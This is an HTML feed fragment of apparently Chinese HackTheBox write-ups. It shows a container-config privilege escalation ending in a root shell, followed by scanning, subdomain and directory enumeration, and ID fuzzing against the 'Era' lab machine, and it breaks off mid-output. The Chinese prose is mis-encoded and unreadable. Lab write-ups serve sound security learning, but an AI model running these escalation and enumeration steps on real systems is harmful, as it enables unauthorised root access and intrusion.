class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><code class="hljs elixir">babywyrm<span class="hljs-variable">@giveback</span><span class="hljs-symbol">:/tmp/pwn</span><span class="hljs-variable">$ </span>cat config.json <br>&#123;<br>    <span class="hljs-string">&quot;ociVersion&quot;</span>: <span class="hljs-string">&quot;1.0.2-dev&quot;</span>,<br>    <span class="hljs-string">&quot;process&quot;</span>: &#123;<br>        <span class="hljs-string">&quot;terminal&quot;</span>: <span class="hljs-literal">true</span>,<br>        <span class="hljs-string">&quot;user&quot;</span>: &#123;<br>            <span class="hljs-string">&quot;uid&quot;</span>: <span class="hljs-number">0</span>,<br>            <span class="hljs-string">&quot;gid&quot;</span>: <span class="hljs-number">0</span><br>        &#125;,<br>        <span class="hljs-string">&quot;args&quot;</span>: [<br>            <span class="hljs-string">&quot;sh&quot;</span><br>        ],<br>        <span class="hljs-string">&quot;env&quot;</span>: [<br>            <span class="hljs-string">&quot;PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin&quot;</span>,<br>            <span class="hljs-string">&quot;TERM=xterm&quot;</span><br>        ],<br>        <span class="hljs-string">&quot;cwd&quot;</span>: <span class="hljs-string">&quot;/&quot;</span>,<br>        <span class="hljs-string">&quot;rlimits&quot;</span>: [<br>            &#123;<br>                <span class="hljs-string">&quot;type&quot;</span>: <span class="hljs-string">&quot;RLIMIT_NOFILE&quot;</span>,<br>                <span class="hljs-string">&quot;hard&quot;</span>: <span class="hljs-number">1024</span>,<br>                <span class="hljs-string">&quot;soft&quot;</span>: <span class="hljs-number">1024</span><br>            &#125;<br>        ]<br>    &#125;,<br>    <span class="hljs-string">&quot;root&quot;</span>: &#123;<br>        <span class="hljs-string">&quot;path&quot;</span>: <span class="hljs-string">&quot;/&quot;</span>,<br>        <span class="hljs-string">&quot;readonly&quot;</span>: <span class="hljs-literal">false</span><br>    &#125;,<br>    <span class="hljs-string">&quot;mounts&quot;</span>: [],<br>    <span class="hljs-string">&quot;linux&quot;</span>: &#123;<br>        <span class="hljs-string">&quot;resources&quot;</span>: &#123;<br>            <span class="hljs-string">&quot;devices&quot;</span>: [<br>                &#123;<br>                    <span class="hljs-string">&quot;allow&quot;</span>: <span class="hljs-literal">true</span>,<br>                    <span class="hljs-string">&quot;access&quot;</span>: <span class="hljs-string">&quot;rwm&quot;</span><br>                &#125;<br>            ]<br>        &#125;,<br>        <span class="hljs-string">&quot;namespaces&quot;</span>: []<br>    &#125;<br>&#125;<br><br></code></pre></td></tr></table></figure><figure class="highlight elixir"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs elixir">babywyrm<span class="hljs-variable">@giveback</span><span class="hljs-symbol">:~</span><span class="hljs-variable">$ </span>mkdir -p root/rootfs<br>babywyrm<span class="hljs-variable">@giveback</span><span class="hljs-symbol">:~</span><span class="hljs-variable">$ </span>cd root/<br>babywyrm<span class="hljs-variable">@giveback</span><span class="hljs-symbol">:~/root</span><span class="hljs-variable">$ </span>vim config.json<br>babywyrm<span class="hljs-variable">@giveback</span><span class="hljs-symbol">:~/root</span><span class="hljs-variable">$ </span>sudo /opt/debug run test<br>[*] <span class="hljs-title class_">Validating</span> sudo privileges...<br>[*] <span class="hljs-title class_">Sudo</span> validation successful<br><span class="hljs-title class_">Please</span> enter the administrative <span class="hljs-symbol">password:</span> <br><br>[*] <span class="hljs-title class_">Administrative</span> password verified<br>[*] <span class="hljs-title class_">Processing</span> <span class="hljs-symbol">command:</span> run<br>[*] <span class="hljs-title class_">Starting</span> <span class="hljs-symbol">container:</span> test<br>babywyrm<span class="hljs-variable">@giveback</span><span class="hljs-symbol">:~/root</span><span class="hljs-variable">$ </span>/tmp/root bash -p<br>rootbash<span class="hljs-number">-5.1</span><span class="hljs-comment"># id</span><br>uid=<span class="hljs-number">1000</span>(babywyrm) gid=<span class="hljs-number">1000</span>(babywyrm) euid=<span class="hljs-number">0</span>(root) groups=<span class="hljs-number">1000</span>(babywyrm)<br><br></code></pre></td></tr></table></figure>]]></content>
    
    
    
    <tags>
      
      <tag>HTB</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>HackTheBox-Era</title>
    <link href="/2025/11/17/HackTheBox-Era/"/>
    <url>/2025/11/17/HackTheBox-Era/</url>
    
    <content type="html"><![CDATA[<p>æˆ‘è¿˜åœ¨è¿™å„¿<br>å¿½ç„¶å°±æ²¡æœ‰åŠ›æ°”äº†</p><hr><h3 id="ä¿¡æ¯æ”¶é›†"><a href="#ä¿¡æ¯æ”¶é›†" class="headerlink" title="ä¿¡æ¯æ”¶é›†"></a>ä¿¡æ¯æ”¶é›†</h3><figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><code class="hljs pgsql"> ./rustscan -a <span class="hljs-number">10.10</span><span class="hljs-number">.11</span><span class="hljs-number">.79</span><br>.<span class="hljs-comment">----. .-. .-. .----..---.  .----. .---.   .--.  .-. .-.</span><br>| &#123;&#125;  &#125;| &#123; &#125; |&#123; &#123;__ &#123;_   _&#125;&#123; &#123;__  /  ___&#125; / &#123;&#125; \ |  `| |<br>| .-. \| &#123;_&#125; |.-._&#125; &#125; | |  .-._&#125; &#125;\     &#125;/  /\  \| |\  |<br>`-<span class="hljs-string">&#x27; `-&#x27;</span>`<span class="hljs-comment">-----&#x27;`----&#x27;  `-&#x27;  `----&#x27;  `---&#x27; `-&#x27;  `-&#x27;`-&#x27; `-&#x27;</span><br>The Modern Day Port Scanner.<br>________________________________________<br>: http://discord.skerritt.blog         :<br>: https://github.com/RustScan/RustScan :<br> <span class="hljs-comment">--------------------------------------</span><br><span class="hljs-number">0</span>day was here â™¥<br><br>[~] The config file <span class="hljs-keyword">is</span> expected <span class="hljs-keyword">to</span> be at &quot;/root/.rustscan.toml&quot;<br>[!] File <span class="hljs-keyword">limit</span> <span class="hljs-keyword">is</span> lower than <span class="hljs-keyword">default</span> batch size. Consider upping <span class="hljs-keyword">with</span> <span class="hljs-comment">--ulimit. May cause harm to sensitive servers</span><br>[!] Your file <span class="hljs-keyword">limit</span> <span class="hljs-keyword">is</span> very small, which negatively impacts RustScan<span class="hljs-string">&#x27;s speed. Use the Docker image, or up the Ulimit with &#x27;</span><span class="hljs-comment">--ulimit 5000&#x27;. </span><br><span class="hljs-keyword">Open</span> <span class="hljs-number">10.10</span><span class="hljs-number">.11</span><span class="hljs-number">.79</span>:<span class="hljs-number">21</span><br><span class="hljs-keyword">Open</span> <span class="hljs-number">10.10</span><span class="hljs-number">.11</span><span class="hljs-number">.79</span>:<span class="hljs-number">80</span><br>[~] Starting Script(s)<br>[~] Starting Nmap <span class="hljs-number">7.94</span>SVN ( https://nmap.org ) at <span class="hljs-number">2025</span><span class="hljs-number">-11</span><span class="hljs-number">-17</span> <span class="hljs-number">01</span>:<span class="hljs-number">04</span> EST<br>Initiating Ping Scan at <span class="hljs-number">01</span>:<span class="hljs-number">04</span><br>Scanning <span class="hljs-number">10.10</span><span class="hljs-number">.11</span><span class="hljs-number">.79</span> [<span class="hljs-number">4</span> ports]<br>Completed Ping Scan at <span class="hljs-number">01</span>:<span class="hljs-number">04</span>, <span class="hljs-number">0.11</span>s elapsed (<span class="hljs-number">1</span> total hosts)<br>Initiating Parallel DNS resolution <span class="hljs-keyword">of</span> <span class="hljs-number">1</span> host. at <span class="hljs-number">01</span>:<span class="hljs-number">04</span><br>Completed Parallel DNS resolution <span class="hljs-keyword">of</span> <span class="hljs-number">1</span> host. at <span class="hljs-number">01</span>:<span class="hljs-number">04</span>, <span class="hljs-number">0.01</span>s elapsed<br>DNS resolution <span class="hljs-keyword">of</span> <span class="hljs-number">1</span> IPs took <span class="hljs-number">0.01</span>s. Mode: Async [#: <span class="hljs-number">1</span>, OK: <span class="hljs-number">0</span>, NX: <span class="hljs-number">1</span>, DR: <span class="hljs-number">0</span>, SF: <span class="hljs-number">0</span>, TR: <span class="hljs-number">1</span>, CN: <span class="hljs-number">0</span>]<br>Initiating SYN Stealth Scan at <span class="hljs-number">01</span>:<span class="hljs-number">04</span><br>Scanning <span class="hljs-number">10.10</span><span class="hljs-number">.11</span><span class="hljs-number">.79</span> [<span class="hljs-number">2</span> ports]<br>Discovered <span class="hljs-keyword">open</span> port <span class="hljs-number">80</span>/tcp <span class="hljs-keyword">on</span> <span class="hljs-number">10.10</span><span class="hljs-number">.11</span><span class="hljs-number">.79</span><br>Discovered <span class="hljs-keyword">open</span> port <span class="hljs-number">21</span>/tcp <span class="hljs-keyword">on</span> <span class="hljs-number">10.10</span><span class="hljs-number">.11</span><span class="hljs-number">.79</span><br>Completed SYN Stealth Scan at <span class="hljs-number">01</span>:<span class="hljs-number">04</span>, <span class="hljs-number">0.20</span>s elapsed (<span class="hljs-number">2</span> total ports)<br>Nmap scan report <span class="hljs-keyword">for</span> <span class="hljs-number">10.10</span><span class="hljs-number">.11</span><span class="hljs-number">.79</span><br>Host <span class="hljs-keyword">is</span> up, received echo-reply ttl <span class="hljs-number">63</span> (<span class="hljs-number">0.097</span>s latency).<br>Scanned at <span class="hljs-number">2025</span><span class="hljs-number">-11</span><span class="hljs-number">-17</span> <span class="hljs-number">01</span>:<span class="hljs-number">04</span>:<span class="hljs-number">41</span> EST <span class="hljs-keyword">for</span> <span class="hljs-number">0</span>s<br><br>PORT   STATE SERVICE REASON<br><span class="hljs-number">21</span>/tcp <span class="hljs-keyword">open</span>  ftp     syn-ack ttl <span class="hljs-number">63</span><br><span class="hljs-number">80</span>/tcp <span class="hljs-keyword">open</span>  http    syn-ack ttl <span class="hljs-number">63</span><br><br><span class="hljs-keyword">Read</span> data files <span class="hljs-keyword">from</span>: /usr/<span class="hljs-keyword">share</span>/nmap<br>Nmap done: <span class="hljs-number">1</span> IP address (<span class="hljs-number">1</span> host up) scanned <span class="hljs-keyword">in</span> <span class="hljs-number">0.44</span> seconds<br>           Raw packets sent: <span class="hljs-number">6</span> (<span class="hljs-number">240</span>B) | Rcvd: <span class="hljs-number">3</span> (<span class="hljs-number">116</span>B)<br></code></pre></td></tr></table></figure><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs awk">ftp <span class="hljs-number">10.10</span>.<span class="hljs-number">11.79</span><br>Connected to <span class="hljs-number">10.10</span>.<span class="hljs-number">11.79</span>.<br><span class="hljs-number">220</span> (vsFTPd <span class="hljs-number">3.0</span>.<span class="hljs-number">5</span>)<br>Name (<span class="hljs-number">10.10</span>.<span class="hljs-number">11.79</span>:kali): anonymous<br><span class="hljs-number">331</span> Please specify the password.<br>Password: <br><span class="hljs-number">530</span> Login incorrect.<br>ftp: Login failed<br>ftp&gt; <br>ftp&gt; <span class="hljs-keyword">exit</span><br><span class="hljs-number">221</span> Goodbye.<br><br></code></pre></td></tr></table></figure><p>ftpæ²¡æ³•åŒ¿åç™»å½•ï¼ŒæŸ¥çœ‹webç•Œé¢ã€‚</p><p>åˆç†æ€€ç–‘æ˜¯è¿™å‡ ä¸ªäººåä¸­çš„ä¸€ä¸ªï¼Œå…ˆå°†è¿™äº›äººåå†™æˆå­—å…¸å¤‡ç”¨ã€‚</p><p><img src="/2025/11/17/HackTheBox-Era/vmware_W3fV5Gxy5W.png"></p><p>å­åŸŸåçˆ†ç ´æœ‰ç»“æœã€‚</p><figure class="highlight asciidoc"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs asciidoc"><span class="hljs-section"> gobuster vhost -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-110000.txt -u http://era.htb/ -t 30 --append-domain</span><br><span class="hljs-section">===============================================================</span><br>Gobuster v3.6<br><span class="hljs-section">by OJ Reeves (@TheColonial) &amp; Christian Mehlmauer (@firefart)</span><br><span class="hljs-section">===============================================================</span><br>[+] Url:             http://era.htb/<br>[+] Method:          GET<br>[+] Threads:         30<br>[+] Wordlist:        /usr/share/seclists/Discovery/DNS/subdomains-top1million-110000.txt<br>[+] User Agent:      gobuster/3.6<br>[+] Timeout:         10s<br>[+] Append Domain:   true<br>===============================================================<br>Starting gobuster in VHOST enumeration mode<br>===============================================================<br>Found: file.era.htb Status: 200 [Size: 6765]<br><span class="hljs-section">Progress: 114441 / 114442 (100.00%)</span><br><span class="hljs-section">===============================================================</span><br><span class="hljs-section">Finished</span><br><span class="hljs-section">===============================================================</span><br><br></code></pre></td></tr></table></figure><p><img src="/2025/11/17/HackTheBox-Era/vmware_Vgad4D6DC5.png"></p><p>å››ä¸ªé€‰é¡¹éƒ½æç¤ºç™»å½•ï¼Œä½†ç”¨ä¸Šé¢çš„äººåé…ä¸Šå¸¸è§çš„å¼±å¯†ç éƒ½æ²¡æœ‰ç»“æœã€‚</p><p>ftpä¹Ÿå°è¯•çˆ†ç ´ï¼Œæ²¡æœ‰ç»“æœã€‚</p><p>å°è¯•çˆ†ç ´ç›®å½•ã€‚</p><figure class="highlight nix"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><code class="hljs nix">â”€<span class="hljs-comment"># dirsearch -u http://file.era.htb</span><br><span class="hljs-operator">/</span>usr<span class="hljs-operator">/</span>lib<span class="hljs-operator">/</span>python3<span class="hljs-operator">/</span>dist-packages<span class="hljs-operator">/</span>dirsearch<span class="hljs-operator">/</span>dirsearch.py:<span class="hljs-number">23</span>: <span class="hljs-params">UserWarning:</span> pkg_resources is deprecated as an API. See https:<span class="hljs-symbol">//setuptools.pypa.io/en/latest/pkg_resources.html.</span> The pkg_resources package is slated for removal as early as <span class="hljs-number">202</span>5-<span class="hljs-number">1</span>1-<span class="hljs-number">30</span>. Refrain from using this package <span class="hljs-keyword">or</span> pin to Setuptools<span class="hljs-operator">&lt;</span><span class="hljs-number">81</span>.<br>  from pkg_resources <span class="hljs-built_in">import</span> DistributionNotFound, VersionConflict<br><br>  _|. _ _  _  _  _ _|_    v0.<span class="hljs-number">4.3</span>                                                                                                                           <br> (_<span class="hljs-operator">||</span>| _) (<span class="hljs-operator">/</span>_(_<span class="hljs-operator">||</span> (_| )                                                                                                                                    <br>                                                                                                                                                           <br><span class="hljs-params">Extensions:</span> php, aspx, jsp, html, js | HTTP <span class="hljs-params">method:</span> GET | <span class="hljs-params">Threads:</span> <span class="hljs-number">25</span> | Wordlist <span class="hljs-params">size:</span> <span class="hljs-number">11460</span><br><br>Output <span class="hljs-params">File:</span> <span class="hljs-symbol">/home/kali/Desktop/reports/http_file.era.htb/_25-11-17_01-36-25.txt</span><br><br><span class="hljs-params">Target:</span> http:<span class="hljs-operator">//</span>file.era.htb<span class="hljs-symbol">/</span><br><br>[<span class="hljs-number">01</span>:<span class="hljs-number">36</span>:<span class="hljs-number">25</span>] <span class="hljs-params">Starting:</span>                                                                                                                                       <br>[<span class="hljs-number">01</span>:<span class="hljs-number">36</span>:<span class="hljs-number">30</span>] <span class="hljs-number">403</span> <span class="hljs-operator">-</span>  <span class="hljs-number">564</span>B  <span class="hljs-operator">-</span> <span class="hljs-symbol">/.ht_wsr.txt</span>                                      <br>[<span class="hljs-number">01</span>:<span class="hljs-number">36</span>:<span class="hljs-number">30</span>] <span class="hljs-number">403</span> <span class="hljs-operator">-</span>  <span class="hljs-number">564</span>B  <span class="hljs-operator">-</span> <span class="hljs-symbol">/.htaccess.sample</span>                                 <br>[<span class="hljs-number">01</span>:<span class="hljs-number">36</span>:<span class="hljs-number">30</span>] <span class="hljs-number">403</span> <span class="hljs-operator">-</span>  <span class="hljs-number">564</span>B  <span class="hljs-operator">-</span> <span class="hljs-symbol">/.htaccess.orig</span><br>[<span class="hljs-number">01</span>:<span class="hljs-number">36</span>:<span class="hljs-number">30</span>] <span class="hljs-number">403</span> <span class="hljs-operator">-</span>  <span class="hljs-number">564</span>B  <span class="hljs-operator">-</span> <span class="hljs-symbol">/.htaccess.bak1</span><br>[<span class="hljs-number">01</span>:<span class="hljs-number">36</span>:<span class="hljs-number">30</span>] <span class="hljs-number">403</span> <span class="hljs-operator">-</span>  <span class="hljs-number">564</span>B  <span class="hljs-operator">-</span> <span class="hljs-symbol">/.htaccess.save</span><br>[<span class="hljs-number">01</span>:<span class="hljs-number">36</span>:<span class="hljs-number">30</span>] <span class="hljs-number">403</span> <span class="hljs-operator">-</span>  <span class="hljs-number">564</span>B  <span class="hljs-operator">-</span> <span class="hljs-symbol">/.htaccess_extra</span>                                  <br>[<span class="hljs-number">01</span>:<span class="hljs-number">36</span>:<span class="hljs-number">30</span>] <span class="hljs-number">403</span> <span class="hljs-operator">-</span>  <span class="hljs-number">564</span>B  <span class="hljs-operator">-</span> <span class="hljs-symbol">/.htaccess_orig</span>                                   <br>[<span class="hljs-number">01</span>:<span class="hljs-number">36</span>:<span class="hljs-number">30</span>] <span class="hljs-number">403</span> <span class="hljs-operator">-</span>  <span class="hljs-number">564</span>B  <span class="hljs-operator">-</span> <span class="hljs-symbol">/.htaccess_sc</span>                                     <br>[<span class="hljs-number">01</span>:<span class="hljs-number">36</span>:<span class="hljs-number">30</span>] <span class="hljs-number">403</span> <span class="hljs-operator">-</span>  <span class="hljs-number">564</span>B  <span class="hljs-operator">-</span> <span class="hljs-symbol">/.htaccessBAK</span><br>[<span class="hljs-number">01</span>:<span class="hljs-number">36</span>:<span class="hljs-number">30</span>] <span class="hljs-number">403</span> <span class="hljs-operator">-</span>  <span class="hljs-number">564</span>B  <span class="hljs-operator">-</span> <span class="hljs-symbol">/.htaccessOLD</span><br>[<span class="hljs-number">01</span>:<span class="hljs-number">36</span>:<span class="hljs-number">30</span>] <span class="hljs-number">403</span> <span class="hljs-operator">-</span>  <span class="hljs-number">564</span>B  <span class="hljs-operator">-</span> <span class="hljs-symbol">/.htaccessOLD2</span><br>[<span class="hljs-number">01</span>:<span class="hljs-number">36</span>:<span class="hljs-number">30</span>] <span class="hljs-number">403</span> <span class="hljs-operator">-</span>  <span class="hljs-number">564</span>B  <span class="hljs-operator">-</span> <span class="hljs-symbol">/.htm</span>                                             <br>[<span class="hljs-number">01</span>:<span class="hljs-number">36</span>:<span class="hljs-number">30</span>] <span class="hljs-number">403</span> <span class="hljs-operator">-</span>  <span class="hljs-number">564</span>B  <span class="hljs-operator">-</span> <span class="hljs-symbol">/.html</span>                                            <br>[<span class="hljs-number">01</span>:<span class="hljs-number">36</span>:<span class="hljs-number">30</span>] <span class="hljs-number">403</span> <span class="hljs-operator">-</span>  <span class="hljs-number">564</span>B  <span class="hljs-operator">-</span> <span class="hljs-symbol">/.httr-oauth</span>                                      <br>[<span class="hljs-number">01</span>:<span class="hljs-number">36</span>:<span class="hljs-number">30</span>] <span class="hljs-number">403</span> <span class="hljs-operator">-</span>  <span class="hljs-number">564</span>B  <span class="hljs-operator">-</span> <span class="hljs-symbol">/.htpasswds</span>                                       <br>[<span class="hljs-number">01</span>:<span class="hljs-number">36</span>:<span class="hljs-number">30</span>] <span class="hljs-number">403</span> <span class="hljs-operator">-</span>  <span class="hljs-number">564</span>B  <span class="hljs-operator">-</span> <span class="hljs-symbol">/.htpasswd_test</span>                                   <br>[<span class="hljs-number">01</span>:<span class="hljs-number">36</span>:<span class="hljs-number">49</span>] <span class="hljs-number">301</span> <span class="hljs-operator">-</span>  <span class="hljs-number">178</span>B  <span class="hljs-operator">-</span> <span class="hljs-symbol">/assets</span>  <span class="hljs-operator">-&gt;</span>  http:<span class="hljs-operator">//</span>file.era.htb<span class="hljs-operator">/</span>assets<span class="hljs-symbol">/</span>          <br>[<span class="hljs-number">01</span>:<span class="hljs-number">36</span>:<span class="hljs-number">49</span>] <span class="hljs-number">403</span> <span class="hljs-operator">-</span>  <span class="hljs-number">564</span>B  <span class="hljs-operator">-</span> <span class="hljs-operator">/</span>assets<span class="hljs-symbol">/</span><br>[<span class="hljs-number">01</span>:<span class="hljs-number">36</span>:<span class="hljs-number">58</span>] <span class="hljs-number">302</span> <span class="hljs-operator">-</span>    <span class="hljs-number">0</span>B  <span class="hljs-operator">-</span> <span class="hljs-symbol">/download.php</span>  <span class="hljs-operator">-&gt;</span>  login.php                      <br>[<span class="hljs-number">01</span>:<span class="hljs-number">37</span>:<span class="hljs-number">01</span>] <span class="hljs-number">301</span> <span class="hljs-operator">-</span>  <span class="hljs-number">178</span>B  <span class="hljs-operator">-</span> <span class="hljs-symbol">/files</span>  <span class="hljs-operator">-&gt;</span>  http:<span class="hljs-operator">//</span>file.era.htb<span class="hljs-operator">/</span>files<span class="hljs-symbol">/</span>            <br>[<span class="hljs-number">01</span>:<span class="hljs-number">37</span>:<span class="hljs-number">01</span>] <span class="hljs-number">403</span> <span class="hljs-operator">-</span>  <span class="hljs-number">564</span>B  <span class="hljs-operator">-</span> <span class="hljs-operator">/</span>files<span class="hljs-symbol">/</span>                                           <br>[<span class="hljs-number">01</span>:<span class="hljs-number">37</span>:<span class="hljs-number">01</span>] <span class="hljs-number">403</span> <span class="hljs-operator">-</span>  <span class="hljs-number">564</span>B  <span class="hljs-operator">-</span> <span class="hljs-operator">/</span>files<span class="hljs-operator">/</span>cache<span class="hljs-symbol">/</span>                                     <br>[<span class="hljs-number">01</span>:<span class="hljs-number">37</span>:<span class="hljs-number">01</span>] <span class="hljs-number">403</span> <span class="hljs-operator">-</span>  <span class="hljs-number">564</span>B  <span class="hljs-operator">-</span> <span class="hljs-operator">/</span>files<span class="hljs-operator">/</span>tmp<span class="hljs-symbol">/</span><br>[<span class="hljs-number">01</span>:<span class="hljs-number">37</span>:<span class="hljs-number">04</span>] <span class="hljs-number">403</span> <span class="hljs-operator">-</span>  <span class="hljs-number">564</span>B  <span class="hljs-operator">-</span> <span class="hljs-operator">/</span>images<span class="hljs-symbol">/</span>                                          <br>[<span class="hljs-number">01</span>:<span class="hljs-number">37</span>:<span class="hljs-number">04</span>] <span class="hljs-number">301</span> <span class="hljs-operator">-</span>  <span class="hljs-number">178</span>B  <span class="hljs-operator">-</span> <span class="hljs-symbol">/images</span>  <span class="hljs-operator">-&gt;</span>  http:<span class="hljs-operator">//</span>file.era.htb<span class="hljs-operator">/</span>images<span class="hljs-symbol">/</span>          <br>[<span class="hljs-number">01</span>:<span class="hljs-number">37</span>:<span class="hljs-number">08</span>] <span class="hljs-number">200</span> <span class="hljs-operator">-</span>   <span class="hljs-number">34</span>KB <span class="hljs-operator">-</span> <span class="hljs-symbol">/LICENSE</span>                                          <br>[<span class="hljs-number">01</span>:<span class="hljs-number">37</span>:<span class="hljs-number">09</span>] <span class="hljs-number">200</span> <span class="hljs-operator">-</span>    <span class="hljs-number">9</span>KB <span class="hljs-operator">-</span> <span class="hljs-symbol">/login.php</span>                                        <br>[<span class="hljs-number">01</span>:<span class="hljs-number">37</span>:<span class="hljs-number">09</span>] <span class="hljs-number">200</span> <span class="hljs-operator">-</span>   <span class="hljs-number">70</span>B  <span class="hljs-operator">-</span> <span class="hljs-symbol">/logout.php</span>                                       <br>[<span class="hljs-number">01</span>:<span class="hljs-number">37</span>:<span class="hljs-number">10</span>] <span class="hljs-number">302</span> <span class="hljs-operator">-</span>    <span class="hljs-number">0</span>B  <span class="hljs-operator">-</span> <span class="hljs-symbol">/manage.php</span>  <span class="hljs-operator">-&gt;</span>  login.php                        <br>[<span class="hljs-number">01</span>:<span class="hljs-number">37</span>:<span class="hljs-number">20</span>] <span class="hljs-number">200</span> <span class="hljs-operator">-</span>    <span class="hljs-number">3</span>KB <span class="hljs-operator">-</span> <span class="hljs-symbol">/register.php</span>                                     <br>[<span class="hljs-number">01</span>:<span class="hljs-number">37</span>:<span class="hljs-number">31</span>] <span class="hljs-number">302</span> <span class="hljs-operator">-</span>    <span class="hljs-number">0</span>B  <span class="hljs-operator">-</span> <span class="hljs-symbol">/upload.php</span>  <span class="hljs-operator">-&gt;</span>  login.php   <br></code></pre></td></tr></table></figure><p>æ‰«åˆ°äº†ä¸€ä¸ªæ³¨å†Œç•Œé¢ï¼Œæ³¨å†Œè´¦å·æˆåŠŸç™»å½•ï¼Œä¼¼ä¹å¯ä»¥ä¸Šä¼ æ–‡ä»¶ã€‚</p><p><img src="/2025/11/17/HackTheBox-Era/vmware_9nJv1PNyyd.png"></p><p>ä¸Šä¼ æ–‡ä»¶åç»™äº†ä¸€ä¸ªä¸‹è½½é“¾æ¥ã€‚</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">http://file.era.htb/download.php?<span class="hljs-built_in">id</span>=7817<br></code></pre></td></tr></table></figure><p>æ³¨æ„åˆ°æœ‰ä¸ªå‚æ•°idã€‚</p><p>å¯èƒ½è¿˜æœ‰å…¶ä»–çš„æ–‡ä»¶å¯ä»¥ä¸‹è½½ï¼Œfuzzä¸€ä¸‹ã€‚</p><figure class="highlight nix"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><code class="hljs nix">ffuf <span class="hljs-operator">-</span>u <span class="hljs-string">&quot;http://file.era.htb/download.php?id=FUZZ&quot;</span> <span class="hljs-operator">-</span>w id.txt <span class="hljs-operator">-</span>H &#x27;Cookie:PHPSESSID<span class="hljs-operator">=</span>jufdhn16ovg3aop3qtp2jevmgg&#x27; <span class="hljs-operator">-</span>fw <span class="hljs-number">3161</span><br><br>        <span class="hljs-operator">/</span>&#x27;___\  <span class="hljs-operator">/</span>&#x27;___\           <span class="hljs-operator">/</span>&#x27;___\       <br>       <span class="hljs-operator">/</span>\ \__<span class="hljs-symbol">/</span> <span class="hljs-operator">/</span>\ \__<span class="hljs-symbol">/</span>  __  __  <span class="hljs-operator">/</span>\ \__<span class="hljs-symbol">/</span>       <br>       \ \ ,__\\ \ ,__\<span class="hljs-operator">/</span>\ \<span class="hljs-operator">/</span>\ \ \ \ ,__\      <br>        \ \ \_<span class="hljs-symbol">/</span> \ \ \_<span class="hljs-operator">/</span>\ \ \_\ \ \ \ \_<span class="hljs-symbol">/</span>      <br>         \ \_\   \ \_\  \ 